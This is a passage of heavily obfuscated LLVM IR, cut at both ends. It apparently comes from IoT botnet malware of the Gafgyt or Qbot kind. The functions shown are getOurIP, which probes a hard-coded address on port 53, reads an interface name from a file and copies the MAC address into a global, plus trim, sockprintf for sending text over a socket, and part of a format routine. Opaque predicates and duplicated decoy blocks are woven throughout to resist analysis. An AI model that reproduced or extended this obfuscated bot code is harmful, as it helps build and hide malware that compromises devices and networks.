  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %25
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %109 = load i32, i32* %7, align 4
  %110 = icmp eq i32 %109, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %111 = load i8*, i8** %4, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %91
  br label %originalBB10
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.7
  %17 = load i32, i32* @y.8
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %1, align 4
  %24 = load i32, i32* @x.7
  %25 = load i32, i32* @y.8
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %229

; <label>:32:                                     ; preds = %0
  %33 = load i32, i32* @x.7
  %34 = load i32, i32* @y.8
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 16, i32 4, i1 false)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)) #6
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call zeroext i16 @htons(i16 zeroext 53) #9
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* %2, align 4
  %49 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %4, align 4
  %51 = load i32, i32* %4, align 4
  %52 = icmp eq i32 %51, -1
  %53 = load i32, i32* @x.7
  %54 = load i32, i32* @y.8
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %78

; <label>:61:                                     ; preds = %originalBBpart24
  %62 = load i32, i32* @x.7
  %63 = load i32, i32* @y.8
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  store i32 0, i32* %1, align 4
  %70 = load i32, i32* @x.7
  %71 = load i32, i32* @y.8
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %229

; <label>:78:                                     ; preds = %originalBBpart24
  store i32 16, i32* %6, align 4
  %79 = load i32, i32* %2, align 4
  %80 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %81 = call i32 @getsockname(i32 %79, %struct.sockaddr* %80, i32* %6) #6
  store i32 %81, i32* %4, align 4
  %82 = load i32, i32* %4, align 4
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %85

; <label>:84:                                     ; preds = %78
  store i32 0, i32* %1, align 4
  br label %229

; <label>:85:                                     ; preds = %78
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  store i32 %88, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %89 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i32 0, i32 0), i32 0)
  store i32 %89, i32* %7, align 4
  br label %90

; <label>:90:                                     ; preds = %175, %85
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %92 = load i32, i32* %7, align 4
  %93 = call i8* @fdgets(i8* %91, i32 4096, i32 %92)
  %94 = icmp ne i8* %93, null
  br i1 %94, label %95, label %177

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* @x.7
  %97 = load i32, i32* @y.8
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  %104 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %105 = call i8* @strstr(i8* %104, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0)) #10
  %106 = icmp ne i8* %105, null
  %107 = load i32, i32* @x.7
  %108 = load i32, i32* @y.8
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %106, label %115, label %175

; <label>:115:                                    ; preds = %originalBBpart212
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %116, i8** %9, align 8
  br label %117

; <label>:117:                                    ; preds = %originalBBpart220, %115
  %118 = load i32, i32* @x.7
  %119 = load i32, i32* @y.8
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %117
  %126 = load i8*, i8** %9, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp ne i32 %128, 9
  %130 = load i32, i32* @x.7
  %131 = load i32, i32* @y.8
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %129, label %138, label %157

; <label>:138:                                    ; preds = %originalBBpart216
  %139 = load i32, i32* @x.7
  %140 = load i32, i32* @y.8
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %138
  %147 = load i8*, i8** %9, align 8
  %148 = getelementptr inbounds i8, i8* %147, i32 1
  store i8* %148, i8** %9, align 8
  %149 = load i32, i32* @x.7
  %150 = load i32, i32* @y.8
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %117

; <label>:157:                                    ; preds = %originalBBpart216
  %158 = load i32, i32* @x.7
  %159 = load i32, i32* @y.8
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %157
  %166 = load i8*, i8** %9, align 8
  store i8 0, i8* %166, align 1
  %167 = load i32, i32* @x.7
  %168 = load i32, i32* @y.8
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %177

; <label>:175:                                    ; preds = %originalBBpart212
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %176, i8 0, i64 4096, i32 16, i1 false)
  br label %90

; <label>:177:                                    ; preds = %originalBBpart224, %90
  %178 = load i32, i32* %7, align 4
  %179 = call i32 @close(i32 %178)
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %181 = load i8, i8* %180, align 16
  %182 = icmp ne i8 %181, 0
  br i1 %182, label %183, label %226

; <label>:183:                                    ; preds = %177
  %184 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %185 = bitcast %union.anon* %184 to [16 x i8]*
  %186 = getelementptr inbounds [16 x i8], [16 x i8]* %185, i32 0, i32 0
  %187 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %188 = call i8* @strcpy(i8* %186, i8* %187) #6
  %189 = load i32, i32* %2, align 4
  %190 = call i32 (i32, i64, ...) @ioctl(i32 %189, i64 35111, %struct.ifreq* %11) #6
  store i32 0, i32* %10, align 4
  br label %191

; <label>:191:                                    ; preds = %222, %183
  %192 = load i32, i32* @x.7
  %193 = load i32, i32* @y.8
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %191
  %200 = load i32, i32* %10, align 4
  %201 = icmp slt i32 %200, 6
  %202 = load i32, i32* @x.7
  %203 = load i32, i32* @y.8
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %201, label %210, label %225

; <label>:210:                                    ; preds = %originalBBpart228
  %211 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %212 = bitcast %union.anon.0* %211 to %struct.sockaddr*
  %213 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %212, i32 0, i32 1
  %214 = getelementptr inbounds [14 x i8], [14 x i8]* %213, i32 0, i32 0
  %215 = load i32, i32* %10, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i8, i8* %214, i64 %216
  %218 = load i8, i8* %217, align 1
  %219 = load i32, i32* %10, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %220
  store i8 %218, i8* %221, align 1
  br label %222

; <label>:222:                                    ; preds = %210
  %223 = load i32, i32* %10, align 4
  %224 = add nsw i32 %223, 1
  store i32 %224, i32* %10, align 4
  br label %191

; <label>:225:                                    ; preds = %originalBBpart228
  br label %226

; <label>:226:                                    ; preds = %225, %177
  %227 = load i32, i32* %2, align 4
  %228 = call i32 @close(i32 %227)
  br label %229

; <label>:229:                                    ; preds = %226, %84, %originalBBpart28, %originalBBpart2
  %230 = load i32, i32* %1, align 4
  ret i32 %230

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %231 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %231, i8 0, i64 16, i32 4, i1 false)
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %232, align 4
  %233 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)) #6
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %235 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %234, i32 0, i32 0
  store i32 %233, i32* %235, align 4
  %236 = call zeroext i16 @htons(i16 zeroext 53) #9
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %236, i16* %237, align 2
  %238 = load i32, i32* %2, align 4
  %239 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %240 = call i32 @connect(i32 %238, %struct.sockaddr* %239, i32 16)
  store i32 %240, i32* %4, align 4
  %241 = load i32, i32* %4, align 4
  %242 = icmp eq i32 %241, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  store i32 0, i32* %1, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  %243 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %244 = call i8* @strstr(i8* %243, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0)) #10
  %245 = icmp ne i8* %244, null
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %117
  %246 = load i8*, i8** %9, align 8
  %247 = load i8, i8* %246, align 1
  %248 = zext i8 %247 to i32
  %249 = icmp ne i32 %248, 9
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %138
  %250 = load i8*, i8** %9, align 8
  %251 = getelementptr inbounds i8, i8* %250, i32 1
  store i8* %251, i8** %9, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %157
  %252 = load i8*, i8** %9, align 8
  store i8 0, i8* %252, align 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %191
  %253 = load i32, i32* %10, align 4
  %254 = icmp slt i32 %253, 6
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

declare i32 @close(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = load i32, i32* @x.9
  %3 = load i32, i32* @y.10
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %12, align 4
  %14 = load i8*, i8** %10, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = sub i64 %15, 1
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %13, align 4
  %18 = load i32, i32* @x.9
  %19 = load i32, i32* @y.10
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart213, %originalBBpart2
  %27 = load i8*, i8** %10, align 8
  %28 = load i32, i32* %12, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = call i32 @isspace(i32 %32) #10
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %54

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* @x.9
  %37 = load i32, i32* @y.10
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %35
  %44 = load i32, i32* %12, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %12, align 4
  %46 = load i32, i32* @x.9
  %47 = load i32, i32* @y.10
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart213, label %originalBB9alteredBB

originalBBpart213:                                ; preds = %originalBB9
  br label %26

; <label>:54:                                     ; preds = %26
  %55 = load i32, i32* @x.9
  %56 = load i32, i32* @y.10
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %54
  %63 = load i32, i32* @x.9
  %64 = load i32, i32* @y.10
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %71

; <label>:71:                                     ; preds = %86, %originalBBpart217
  %72 = load i32, i32* %13, align 4
  %73 = load i32, i32* %12, align 4
  %74 = icmp sge i32 %72, %73
  br i1 %74, label %75, label %84

; <label>:75:                                     ; preds = %71
  %76 = load i8*, i8** %10, align 8
  %77 = load i32, i32* %13, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = call i32 @isspace(i32 %81) #10
  %83 = icmp ne i32 %82, 0
  br label %84

; <label>:84:                                     ; preds = %75, %71
  %85 = phi i1 [ false, %71 ], [ %83, %75 ]
  br i1 %85, label %86, label %89

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, -1
  store i32 %88, i32* %13, align 4
  br label %71

; <label>:89:                                     ; preds = %84
  %90 = load i32, i32* %12, align 4
  store i32 %90, i32* %11, align 4
  br label %91

; <label>:91:                                     ; preds = %123, %89
  %92 = load i32, i32* @x.9
  %93 = load i32, i32* @y.10
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %91
  %100 = load i32, i32* %11, align 4
  %101 = load i32, i32* %13, align 4
  %102 = icmp sle i32 %100, %101
  %103 = load i32, i32* @x.9
  %104 = load i32, i32* @y.10
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %102, label %111, label %126

; <label>:111:                                    ; preds = %originalBBpart221
  %112 = load i8*, i8** %10, align 8
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %10, align 8
  %118 = load i32, i32* %11, align 4
  %119 = load i32, i32* %12, align 4
  %120 = sub nsw i32 %118, %119
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %117, i64 %121
  store i8 %116, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %111
  %124 = load i32, i32* %11, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %11, align 4
  br label %91

; <label>:126:                                    ; preds = %originalBBpart221
  %127 = load i8*, i8** %10, align 8
  %128 = load i32, i32* %11, align 4
  %129 = load i32, i32* %12, align 4
  %130 = sub nsw i32 %128, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %127, i64 %131
  store i8 0, i8* %132, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %133 = alloca i8*, align 8
  %134 = alloca i32, align 4
  %135 = alloca i32, align 4
  %136 = alloca i32, align 4
  store i8* %0, i8** %133, align 8
  store i32 0, i32* %135, align 4
  %137 = load i8*, i8** %133, align 8
  %138 = call i64 @strlen(i8* %137) #10
  %_ = shl i64 %138, 1
  %_1 = sub i64 %138, 1
  %gen = mul i64 %_1, 1
  %_2 = sub i64 0, %138
  %gen3 = add i64 %_2, 1
  %_4 = shl i64 %138, 1
  %_5 = shl i64 %138, 1
  %_6 = shl i64 %138, 1
  %_7 = sub i64 0, %138
  %gen8 = add i64 %_7, 1
  %139 = sub i64 %138, 1
  %140 = trunc i64 %139 to i32
  store i32 %140, i32* %136, align 4
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %35
  %141 = load i32, i32* %12, align 4
  %_10 = sub i32 0, %141
  %gen11 = add i32 %_10, 1
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %12, align 4
  br label %originalBB9

originalBB15alteredBB:                            ; preds = %originalBB15, %54
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %91
  %143 = load i32, i32* %11, align 4
  %144 = load i32, i32* %13, align 4
  %145 = icmp sle i32 %143, %144
  br label %originalBB19
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #6
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #6
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = load i32, i32* @x.13
  %5 = load i32, i32* @y.14
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca %struct.__va_list_tag*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8], align 1
  %19 = alloca i8*, align 8
  store i8** %0, i8*** %12, align 8
  store i8* %1, i8** %13, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %14, align 8
  store i32 0, i32* %17, align 4
  %20 = load i32, i32* @x.13
  %21 = load i32, i32* @y.14
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %571, %originalBBpart2
  %29 = load i8*, i8** %13, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %574

; <label>:33:                                     ; preds = %28
  %34 = load i32, i32* @x.13
  %35 = load i32, i32* @y.14
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i8*, i8** %13, align 8
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 37
  %46 = load i32, i32* @x.13
  %47 = load i32, i32* @y.14
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %546

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i8*, i8** %13, align 8
  %56 = getelementptr inbounds i8, i8* %55, i32 1
  store i8* %56, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %57 = load i8*, i8** %13, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
